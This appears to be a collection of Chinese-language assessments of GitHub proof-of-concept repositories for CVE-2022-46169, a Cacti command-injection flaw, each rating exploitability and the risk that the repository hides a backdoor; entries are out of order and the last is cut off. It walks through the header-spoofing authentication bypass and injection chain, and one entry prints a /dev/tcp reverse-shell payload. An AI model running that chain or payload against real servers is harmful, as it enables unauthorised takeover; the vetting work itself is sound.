3.  **寻找合适的 poller_item：** 攻击者需要找到 `action` 类型为 `POLLER_ACTION_SCRIPT_PHP` 的 `poller_item`。脚本通过暴力破解`host_id`和`local_data_ids`，直到找到匹配的`poller_item`。预定义的模版比如 *Device - Uptime* 很容易满足条件.

**POC有效性：**
提供的POC代码尝试自动化利用此漏洞。它首先检查目标URL的`/remote_agent.php`或者`/cacti/remote_agent.php`路径是否存在。然后，它尝试通过设置`X-Forwarded-For`头来绕过身份验证。如果身份验证绕过成功，它会尝试暴力破解`host_id`和`local_data_ids`来发现适合利用的`poller_item`。最后，如果找到了合适的`poller_item`，可以注入命令。

**投毒风险：**
查看了给出的python脚本`CVE-2022-46169.py`和`README.md`文件，主要是漏洞验证和利用的脚本，仓库中没有发现明显的恶意代码，但是仍然存在一定的投毒风险。例如，脚本可能会被修改为：

1.  **下载和执行恶意代码：**  在成功利用漏洞后，脚本可以从远程服务器下载并执行恶意代码。
2.  **修改系统文件：**  脚本可以修改系统文件，例如 `/etc/hosts`，将用户重定向到恶意网站。
3.  **收集敏感信息：** 脚本可以收集系统敏感信息，例如用户名、密码和网络配置，并将信息发送到远程服务器。

给出的投毒风险百分比为5%，主要考虑的点为作者开源了exp脚本，其他人可以通过下载该脚本然后进行修改，加入恶意代码，再进行传播，从而达到投毒的目的。

**项目地址:** [miko550/CVE-2022-46169](https://github.com/miko550/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #27

**来源**: [CVE-2022-46169-mind2hex_CVE-2022-46169.md](../2022/CVE-2022-46169-mind2hex_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要网络访问，存在启用了`POLLER_ACTION_SCRIPT_PHP`的poller_item

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169是Cacti中一个未经身份验证的命令注入漏洞。攻击者可以通过`remote_agent.php`文件，绕过身份验证，并利用`polldata` action注入恶意命令。

**利用方式：**

1.  **身份验证绕过：** 通过设置`X-Forwarded-For`头为`127.0.0.1`来欺骗`get_client_addr`函数，绕过`remote_agent.php`的身份验证。
2.  **命令注入：** 绕过身份验证后，攻击者可以利用`polldata` action。`poller_id`参数未经过滤，直接传递给`proc_open`函数，导致命令注入。 需要存在一个`poller_item` 其action 类型为 `POLLER_ACTION_SCRIPT_PHP`
3.  **参数枚举：** 如果不知道`host_id`和`local_data_id`，可以使用提供的POC脚本进行暴力破解。

**有效性分析：**

根据漏洞描述和POC代码，该漏洞利用是有效的。POC代码实现了身份验证绕过和命令注入，并提供了暴力破解`host_id`和`local_data_id`的功能。

**投毒风险分析：**

查看提供的POC代码，未发现明显的投毒代码。脚本逻辑清晰，主要功能是漏洞利用。代码通过构造恶意请求来利用漏洞，没有发现尝试在目标系统上安装后门或执行恶意操作的迹象。因此，投毒风险很低，约为0%。脚本依赖`requests`库，如果`requests`库被篡改，可能存在风险，但这不属于此仓库本身的投毒。

**总结：**

CVE-2022-46169是一个严重的安全漏洞，允许未经身份验证的攻击者在Cacti服务器上执行任意命令。该漏洞利用简单，影响广泛，需要及时修补。提供的POC代码可以有效利用此漏洞。

**项目地址:** [mind2hex/CVE-2022-46169](https://github.com/mind2hex/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #28

**来源**: [CVE-2022-46169-r1nzleer_RCE-Cacti-1.2.22.md](../2022/CVE-2022-46169-r1nzleer_RCE-Cacti-1.2.22.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行着受影响版本的Cacti，并且存在具有`POLLER_ACTION_SCRIPT_PHP`动作类型的poller_item。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过操纵 `X-Forwarded-For` HTTP Header绕过身份验证，并结合构造恶意的 `poller_id` 参数，在 `remote_agent.php` 文件中执行任意操作系统命令。 

**有效性分析：**

根据漏洞描述和提供的漏洞利用代码，该漏洞利用过程如下：

1.  **身份验证绕过：** 通过设置 `X-Forwarded-For` HTTP Header 为 `127.0.0.1` 来欺骗 `get_client_addr` 函数，使其返回 Cacti 服务器的 IP 地址，从而绕过身份验证检查。
2.  **寻找有效的 `host_id` 和 `local_data_ids[]`：** 漏洞利用代码使用暴力破解的方式查找具有 `POLLER_ACTION_SCRIPT_PHP` 动作类型的 `poller_item` 所对应的 `host_id` 和 `local_data_ids[]`。  这是必要的，因为需要一个特定的配置才能触发命令注入点。
3.  **命令注入：** 构造包含恶意命令的 `poller_id` 参数，并将其发送到 `remote_agent.php`。由于 `poller_id` 参数未经过滤，恶意命令会被注入到 `proc_open` 函数中执行。

参考搜索引擎结果，已经有公开的利用该漏洞的报告和利用代码，表明该漏洞是可利用的。

**投毒风险分析：**

代码本身的主要功能是利用 CVE-2022-46169 漏洞进行命令注入，实现远程代码执行。仔细审查代码，并未发现明显的恶意行为，例如上传恶意文件、篡改系统配置等。但是，任何从互联网上下载的代码都存在潜在风险，因此仍需谨慎使用。

以下是一些潜在的投毒风险和缓解措施：

*   **依赖项风险：** 代码中使用了 `requests` 和 `urllib.parse` 库。虽然这些库本身是安全的，但如果通过 `pip` 安装时，存在被中间人攻击替换为恶意库的风险。 建议从官方源安装依赖项，并验证其完整性。
*   **Payload 风险：** 攻击者可以构造恶意的命令，对目标系统造成破坏。例如，删除关键文件、停止服务等。用户在使用时需要谨慎，避免执行不信任的命令。
*   **隐蔽后门：** 作者可能在代码中添加一些不明显的后门，例如，将执行结果发送到远程服务器，或在系统上创建一个隐藏的账户。 尽管当前代码未发现此类行为，但仍需保持警惕。

综合考虑，认为该代码存在较低的投毒风险，约为 5%。 主要风险来自于使用者自身对命令的控制不当，以及作者可能加入不易察觉的隐蔽后门代码的可能性。使用前应仔细审查代码，并进行安全测试。

**漏洞利用方式：**

1.  攻击者发送带有特制 `X-Forwarded-For` 头的 HTTP 请求到 `remote_agent.php`，绕过身份验证。
2.  攻击者通过暴力破解或其它方式，找到有效的 `host_id` 和 `local_data_ids[]`，它们对应于一个配置为 `POLLER_ACTION_SCRIPT_PHP` 的 `poller_item`。
3.  攻击者构造包含恶意命令的 `poller_id` 参数，并将其发送到 `remote_agent.php`。
4.  服务器执行恶意命令，攻击者获得对服务器的控制权。

**项目地址:** [r1nzleer/RCE-Cacti-1.2.22](https://github.com/r1nzleer/RCE-Cacti-1.2.22)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #29

**来源**: [CVE-2022-46169-ruycr4ft_CVE-2022-46169.md](../2022/CVE-2022-46169-ruycr4ft_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统上存在具有`POLLER_ACTION_SCRIPT_PHP` action类型的poller_item配置，并且能够通过伪造HTTP头绕过身份验证。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是一个存在于Cacti 1.2.23之前版本中的未经身份验证的命令注入漏洞。该漏洞存在于`remote_agent.php`文件中。攻击者可以通过伪造`X-Forwarded-For`等HTTP头来绕过身份验证，利用`get_client_addr`函数的缺陷，使其返回运行Cacti服务器的IP地址。然后，通过`polldata` action，攻击者可以控制`poller_id`参数，由于该参数未经过滤就被传递给`proc_open`函数执行，从而导致命令注入。PoC代码首先检查目标是否易受攻击，然后通过暴力破解`host_id`和`local_data_ids`来找到具有`POLLER_ACTION_SCRIPT_PHP` action的`poller_item`。 找到有效的`host_id`和`local_data_ids`后，将构造包含恶意payload的URL并发送到目标系统。攻击者可以利用此漏洞在目标服务器上执行任意命令，例如下载恶意软件或窃取敏感数据。

**投毒风险分析：**

PoC代码主要功能是利用漏洞，但存在轻微的投毒风险：

1.  **Payload来源：** PoC代码要求用户输入IP地址和端口，然后生成反向shell的payload。如果用户不小心输入了错误的IP地址或端口，可能会导致连接到错误的服务器，或者暴露自己的IP地址。
2.  **依赖外部资源：** PoC依赖于`requests`和`urllib.parse`库，这些库可能存在安全问题或被篡改，但可能性较低。
3.  **Payload执行环境：** 生成的payload在目标服务器上执行，如果目标服务器的安全配置不当，可能会被恶意利用。
4.  **代码可读性：** 代码相对清晰，没有明显的恶意行为，但仍然需要仔细审查。

总体来说，PoC代码的投毒风险较低，主要是由于用户输入和执行环境带来的风险。如果代码是从可信来源获取，并且用户仔细审查过代码，那么风险可以忽略不计。

**项目地址:** [ruycr4ft/CVE-2022-46169](https://github.com/ruycr4ft/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #30

**来源**: [CVE-2022-46169-sAsPeCt488_CVE-2022-46169.md](../2022/CVE-2022-46169-sAsPeCt488_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统运行Cacti，并且存在至少一个`poller_item`，其`action`类型为`POLLER_ACTION_SCRIPT_PHP` (值为2)。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169是Cacti 1.2.23之前版本中的一个未经身份验证的命令注入漏洞。攻击者可以通过操纵`remote_agent.php`文件中的`poller_id`参数来执行任意操作系统命令。漏洞利用主要分为两个阶段：首先，通过设置`X-Forwarded-For`头绕过身份验证，伪造客户端IP地址，使其与Cacti服务器的IP地址匹配。然后，构造包含恶意命令的`poller_id`参数，并将其发送到`remote_agent.php`，最终导致命令注入。该POC代码通过循环尝试不同的`host_id`来发现可以利用的配置。POC代码没有发现明显的投毒行为，主要目的是利用漏洞执行命令。搜索引擎结果也表明该漏洞已被公开利用。

**项目地址:** [sAsPeCt488/CVE-2022-46169](https://github.com/sAsPeCt488/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #31

**来源**: [CVE-2022-46169-yassinebk_CVE-2022-46169.md](../2022/CVE-2022-46169-yassinebk_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要Cacti服务运行且存在特定的数据源配置（poller_item具有POLLER_ACTION_SCRIPT_PHP action）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169是Cacti 1.2.23之前版本中的一个未授权命令注入漏洞。攻击者可以利用`remote_agent.php`文件中的授权绕过缺陷，通过伪造HTTP头（例如`X-Forwarded-For`），绕过IP地址验证，并利用`polldata`操作中的`poller_id`参数进行命令注入。

**漏洞利用方式：**

1.  **授权绕过：** 通过设置`X-Forwarded-For` HTTP头，模拟Cacti服务器自身的IP地址，绕过`remote_agent.php`的授权检查。这是因为`get_client_addr`函数信任`HTTP_`开头的`$_SERVER`变量，攻击者可以控制这些变量。
2.  **ID爆破：** 爆破`host_id`和`local_data_id`参数，寻找一个`poller_item`记录，其`action`字段的值为`POLLER_ACTION_SCRIPT_PHP` (值为2)，表明该条目会执行PHP脚本。
3.  **命令注入：** 将恶意命令注入到`poller_id`参数中。由于`get_nfilter_request_var`函数没有充分过滤该参数，导致命令注入。
4.  **远程代码执行：** 通过`proc_open`函数执行注入的命令，从而实现远程代码执行。

**有效性分析：**

根据漏洞描述和提供的POC代码，该漏洞利用方式是有效的。POC代码首先检查目标是否存在漏洞，然后通过爆破`host_id`和`local_data_id`找到合适的`poller_item`记录，最后构造包含恶意命令的URL并发送请求，实现远程代码执行。

**投毒风险分析：**

分析提供的POC代码，没有发现明显的恶意代码或后门。脚本的功能集中于漏洞利用，没有其他可疑操作。因此，投毒风险评估为0%。

**项目地址:** [yassinebk/CVE-2022-46169](https://github.com/yassinebk/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---



---

## POC #8

**来源**: [CVE-2022-46169-MarkStrendin_CVE-2022-46169.md](../2022/CVE-2022-46169-MarkStrendin_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程命令执行

**影响版本:** < 1.2.23

**利用条件:** Cacti服务器运行，且存在具有`POLLER_ACTION_SCRIPT_PHP`动作类型的poller_item，需要网络可达。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前的版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过构造特制的 HTTP 请求绕过身份验证，并利用 `remote_agent.php` 文件中的漏洞执行任意系统命令。

**漏洞利用方式：**

1.  **身份验证绕过：** 攻击者可以通过设置 `X-Forwarded-For` 或其他 `HTTP_` 开头的 HTTP Header，伪造客户端IP地址，使其与Cacti服务器自身的IP地址相同。`get_client_addr` 函数会读取这些header，然后 `gethostbyaddr` 函数将伪造的IP解析为主机名。由于 Cacti 的 `poller` 表中默认存在服务器自身的主机名记录，因此绕过身份验证。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以向 `remote_agent.php` 发送带有 `action=polldata` 参数的请求，并指定 `host_id`、`local_data_ids[]` 和 `poller_id`。其中，`poller_id` 参数没有经过充分的过滤，攻击者可以在 `poller_id` 中注入恶意命令。
3.  **寻找合适的poller_item：** 为了触发命令注入，需要存在一个 `poller_item`，其 `action` 字段的值为 `POLLER_ACTION_SCRIPT_PHP` (值为2)。

**POC代码分析：**

提供的POC代码是一个 Python 脚本，用于利用 CVE-2022-46169 漏洞。该脚本首先检查目标是否易受攻击，然后暴力破解 `host_id` 和 `local_data_id`，以便找到具有 `POLLER_ACTION_SCRIPT_PHP` 操作的 `poller_item`。 一旦找到，它会构造一个包含恶意负载的 HTTP 请求并发送到 `remote_agent.php`。

**投毒风险分析：**

该代码主要目的是发送payload以获得反向shell，并没有发现恶意修改或删除文件等高危操作。代码的功能基本符合描述，但仍然存在一些潜在风险。

*   **依赖风险：** 代码依赖 `requests` 库，如果 `requests` 库被恶意篡改，可能会导致安全问题。
*   **配置错误：** 攻击者可能会错误配置 `attacker_ip` 和 `attacker_port`，导致攻击失败或暴露自己的IP地址。

根据以上分析，该POC存在较低的投毒风险。 代码的主要功能是利用已知漏洞，没有发现额外的恶意代码或隐藏功能，但也不能完全排除攻击者在实际使用中进行修改以达到其他目的的可能性。 风险评估较低，约为5%。

**结论：**

该漏洞的利用较为直接，POC代码有效。 漏洞存在投毒风险，但风险较低。

**项目地址:** [MarkStrendin/CVE-2022-46169](https://github.com/MarkStrendin/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #9

**来源**: [CVE-2022-46169-N1arut_CVE-2022-46169_POC.md](../2022/CVE-2022-46169-N1arut_CVE-2022-46169_POC.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行受影响的Cacti版本，并且存在`POLLER_ACTION_SCRIPT_PHP`类型的poller_item。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前的版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过操纵 HTTP 头 `X-Forwarded-For` 绕过身份验证，并利用 `remote_agent.php` 脚本中的漏洞执行任意系统命令。

**漏洞利用方式：**

1.  **身份验证绕过:** 通过设置 `X-Forwarded-For` 头为 Cacti 服务器的 IP 地址，欺骗 `get_client_addr` 函数，绕过身份验证。
2.  **查找可利用的 poller_item:**  通过暴力破解 `host_id` 和 `local_data_id`，找到 `action` 为 `POLLER_ACTION_SCRIPT_PHP` (值为 2)的 `poller_item`。
3.  **命令注入:** 将恶意命令注入到 `poller_id` 参数中，通过 `proc_open` 函数执行。

**POC代码分析：**

*   `cacti_exploit.py` 脚本自动化了漏洞利用过程。
*   首先尝试访问 `/remote_agent.php?action=polldata` 或 `/cacti/remote_agent.php?action=polldata` 来确定正确的URL。
*   然后，脚本使用 `X-Forwarded-For` 头绕过身份验证。
*   接下来，脚本暴力破解 `host_id` 和 `local_data_ids` 来寻找合适的 `poller_item`。
*   最后，脚本构造包含反向 shell 命令的 URL，并发送请求来利用命令注入漏洞。

**有效性：**

根据漏洞描述、搜索结果以及提供的 POC 代码，此漏洞是有效的。搜索结果表明该漏洞已被积极利用。

**投毒风险：**

虽然该脚本的主要目的是利用 CVE-2022-46169 漏洞，但存在轻微的投毒风险。具体体现在：

*   **硬编码参数:** 脚本中存在一些硬编码的参数，例如 `poller_id=1`，`host_id=1`，`local_data_ids[]=1`, `words = ["cpu","cmd.php","polling_time","apache"]`。这些值在不同的 Cacti 部署中可能不同，如果用户不加修改直接使用，可能导致利用失败。这可以被视为一种隐蔽的“陷阱”，虽然不是恶意的后门，但也可能误导用户。
*   **反向Shell Payload:** 用户如果直接使用payload `sh -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1`需要确保目标机器上存在sh.如果没有可能需要更换payload.如果不熟悉的用户可能利用失败.
*   **依赖第三方库:** 脚本依赖 `requests` 和 `urllib3` 库。如果用户从不可信的源安装这些库，可能会引入恶意代码。

尽管如此，该脚本没有发现明显的恶意代码（如删除文件、上传恶意文件等），因此投毒的概率较低，约为5%。主要风险在于使用不当或未能正确配置脚本导致利用失败。


**项目地址:** [N1arut/CVE-2022-46169_POC](https://github.com/N1arut/CVE-2022-46169_POC)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #10

**来源**: [CVE-2022-46169-RdBBB3_SHELL-POC-CVE-2022-46169.md](../2022/CVE-2022-46169-RdBBB3_SHELL-POC-CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti版本低于1.2.23，并且存在action类型为POLLER_ACTION_SCRIPT_PHP的poller_item。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 中的一个命令注入漏洞。未经身份验证的攻击者可以通过操纵`remote_agent.php`文件中的输入，利用`poller_id`参数执行任意操作系统命令。攻击流程如下：

1.  **身份验证绕过：** 攻击者通过设置`X-Forwarded-For`头绕过身份验证。这是因为`get_client_addr`函数信任`HTTP_`开头的`$_SERVER`变量，允许攻击者伪造客户端IP地址，从而通过`poller`表中的主机名检查。
2.  **触发命令注入：** 绕过身份验证后，攻击者可以调用`remote_agent.php`的`polldata`动作。`poll_for_data`函数检索请求参数并加载相应的`poller_item`条目。如果`poller_item`的`action`等于`POLLER_ACTION_SCRIPT_PHP`，则使用`proc_open`执行PHP脚本。`poller_id`参数在传递给`proc_open`之前未经过充分过滤，从而导致命令注入。
3.  **漏洞利用代码分析：**  `poc.sh` 脚本首先解析用户提供的参数（目标URL、本地IP和端口），然后构造反向shell的payload，并对其进行URL编码。脚本通过发送带有`X-Forwarded-For`头的HTTP请求来检查目标是否易受攻击。该脚本通过暴力破解`host_id`和`local_data_ids`来枚举有效的URL。最后，它使用构造的payload向目标发送一个请求，从而触发反向shell。
4.  **投毒风险评估：**  该POC的主要目的是利用漏洞实现反向Shell。检查`poc.sh`脚本，发现脚本本身主要功能是生成Payload、URL编码、发送HTTP请求。虽然存在修改反向连接IP和端口的可能性，但没有发现明显的恶意代码或后门。`README.md`中建议访问的GitHub仓库 (`https://github.com/m3ssap0/cacti-rce-cve-2022-46169-vulnerable-application`)，用于搭建漏洞环境，**存在一定风险，应该注意**。总体而言，脚本投毒风险较低，初步评估为5%。风险主要来自于下载其他来源的poc，或者使用poc访问陌生的网址。
5.  **有效性评估:** 该POC的有效性较高，因为它可以自动化漏洞利用过程，从身份验证绕过到命令执行。多个搜索引擎结果表明该漏洞已被积极利用。
6.  **利用方式总结：** 通过伪造HTTP头绕过身份验证，然后利用未过滤的`poller_id`参数在`remote_agent.php`中注入命令，最终实现远程代码执行。

**项目地址:** [RdBBB3/SHELL-POC-CVE-2022-46169](https://github.com/RdBBB3/SHELL-POC-CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #11

**来源**: [CVE-2022-46169-Rickster5555_EH2-PoC.md](../2022/CVE-2022-46169-Rickster5555_EH2-PoC.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行受影响版本的Cacti，且存在具有`POLLER_ACTION_SCRIPT_PHP`动作类型的poller_item。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是Cacti中存在的一个命令注入漏洞，允许未经身份验证的攻击者在服务器上执行任意命令。漏洞存在于`remote_agent.php`文件中，由于对客户端IP地址的验证不严谨，攻击者可以通过设置`X-Forwarded-For`等HTTP头部绕过身份验证。绕过验证后，可以调用`polldata`动作，并利用`poller_id`参数的命令注入漏洞执行系统命令。

**利用方式：**

1.  攻击者发送带有恶意`X-Forwarded-For`头部的HTTP请求到`remote_agent.php`，伪造客户端IP地址，绕过身份验证。
2.  攻击者构造包含命令注入的`poller_id`参数的HTTP请求，发送到`remote_agent.php`，执行任意系统命令。 为了成功利用，必须存在一个`poller_item`，其`action`类型为`POLLER_ACTION_SCRIPT_PHP`（值为2）。

**POC有效性：**

提供的PoC代码通过发送带有特定HTTP头部的GET请求，利用`poller_id`参数执行命令注入。根据漏洞描述和PoC代码，该PoC是有效的，可以用于验证漏洞的存在。

**投毒风险：**

查看提供的文件，包括`README.md`、`cacti-CI-poc.py`、`docker-compose.yml`和`entrypoint.sh`。

*   `README.md`：包含漏洞描述、复现步骤和参考链接，没有发现恶意代码。
*   `cacti-CI-poc.py`：PoC脚本，用于发送HTTP请求触发命令注入，没有发现恶意代码，但利用时执行的命令完全由使用者控制，具有潜在风险。
*   `docker-compose.yml`：Docker Compose配置文件，用于构建包含漏洞版本的Cacti环境，没有发现恶意配置。
*   `entrypoint.sh`：Docker容器的入口脚本，用于初始化Cacti数据库和设置权限，没有发现明显的恶意代码，但其中`mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"`语句禁用了管理员密码强制修改，这可能会降低安全性。

总体来说，该仓库的投毒风险较低，但入口脚本中禁用了管理员密码强制修改，存在潜在的安全风险。

投毒风险评估：5%。

**项目地址:** [Rickster5555/EH2-PoC](https://github.com/Rickster5555/EH2-PoC)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #12

**来源**: [CVE-2022-46169-Safarchand_CVE-2022-46169.md](../2022/CVE-2022-46169-Safarchand_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统运行受影响版本的Cacti，并且存在具有`POLLER_ACTION_SCRIPT_PHP`操作的`poller_item`。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-46169是Cacti 1.2.23之前版本中的一个命令注入漏洞。攻击者可以通过构造`X-Forwarded-For`头绕过身份验证，然后利用`remote_agent.php`中的`polldata`操作注入恶意命令。该POC利用`X-Forwarded-For`头伪造客户端IP，绕过身份验证，然后通过`poller_id`参数向`proc_open`函数传递恶意payload，从而执行任意命令。POC尝试通过暴力破解`host_id`来找到一个可用的`poller_item`。代码中使用了`pexpect`来创建一个交互式的nc会话，以便接收反向shell。虽然使用了base64编码，但这是为了避免命令中的特殊字符导致问题，不是隐藏恶意代码，但是通过nc反弹shell存在被利用进行恶意操作的风险，因此存在一定的投毒风险，但是概率较低。整体而言，POC代码目的是为了验证漏洞存在，因此投毒概率较低，约为10%。

**漏洞利用方式：**

1.  **绕过认证：** 通过设置`X-Forwarded-For`头为Cacti服务器的IP地址，欺骗`get_client_addr`函数，绕过认证。
2.  **触发命令注入：**  向`remote_agent.php`发送包含`polldata` action的请求，并将恶意命令注入到`poller_id`参数中。  利用`proc_open`函数执行注入的命令。
3. **反弹shell:** 该poc通过反弹shell获得服务器控制权。

**项目地址:** [Safarchand/CVE-2022-46169](https://github.com/Safarchand/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #13

**来源**: [CVE-2022-46169-SystemVll_CVE-2022-46169.md](../2022/CVE-2022-46169-SystemVll_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统运行Cacti，并且存在action类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前的版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过操控HTTP请求头中的`Forwarded-For`字段，绕过身份验证，然后通过`remote_agent.php`文件中的`polldata`操作，并结合一个action类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`，将恶意命令注入到`proc_open`函数中执行，从而实现远程代码执行。

**漏洞利用方式:**
1.  **身份验证绕过:** 通过设置`Forwarded-For`等HTTP头，伪造客户端IP地址，绕过`remote_agent.php`的身份验证。
2.  **触发命令注入:**  发送带有恶意`poller_id`参数的请求到`remote_agent.php?action=polldata`，该参数会被插入到`proc_open`函数执行的命令中。
3.  **寻找`POLLER_ACTION_SCRIPT_PHP`:**  漏洞利用的前提是存在一个action类型为`POLLER_ACTION_SCRIPT_PHP`的`poller_item`。需要找到对应的`host_id`和`local_data_id`。

**有效性:**
根据漏洞描述，此漏洞利用代码利用了未经授权的远程代理来执行任意系统命令，因此有效。

**投毒风险:**
提供的代码段是 Apache 2.0 许可协议，不包含任何可执行代码或恶意代码，因此投毒风险为0%。核心的PoC代码并没有提供，因此无法判断攻击者是否进行了后门代码验证，只能判断提供的许可协议不存在投毒风险。

**项目地址:** [SystemVll/CVE-2022-46169](https://github.com/SystemVll/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #14

**来源**: [CVE-2022-46169-a1665454764_CVE-2022-46169.md](../2022/CVE-2022-46169-a1665454764_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-远程命令执行

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 远程命令执行

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行Cacti，并且存在具有 'POLLER_ACTION_SCRIPT_PHP' action类型的poller_item。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中的一个未经验证的远程命令执行漏洞。攻击者可以通过构造特定的 HTTP 请求，绕过身份验证，并在目标系统上执行任意命令。

**漏洞利用方式：**

1.  **身份验证绕过：** 攻击者通过设置`X-Forwarded-For`等HTTP Header, 伪造客户端 IP 地址，绕过`remote_agent.php`的身份验证。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以通过 `polldata` action，并控制 `poller_id` 参数，将恶意命令注入到 `proc_open` 函数的参数中，从而执行任意系统命令。
3.  **前提条件：** 漏洞利用需要存在一个 `poller_item`，其 `action` 字段设置为 `POLLER_ACTION_SCRIPT_PHP` (值为2)。默认安装的Cacti，很可能存在满足此条件的`poller_item`。
4.  **POC有效性:** 提供的POC代码有效, 利用`remote_agent.php`，设置`X-Forwarded-For` header，构造包含恶意命令的URL,发送请求来执行命令。
5. **投毒风险:** README.md 为漏洞复现步骤，以及github仓库的使用方式说明。POC代码本身除了写入output.txt之外没有发现其他恶意行为。虽然存在一定的风险，例如该代码可能被恶意修改后传播，但当前提供的代码投毒概率较低，大约为1%。该POC的主要功能是检测漏洞是否存在并执行命令，而不是植入后门。

**项目地址:** [a1665454764/CVE-2022-46169](https://github.com/a1665454764/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #15

**来源**: [CVE-2022-46169-alv-david_CVE-2022-46169-Cacti-1.2.22.md](../2022/CVE-2022-46169-alv-david_CVE-2022-46169-Cacti-1.2.22.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程代码执行

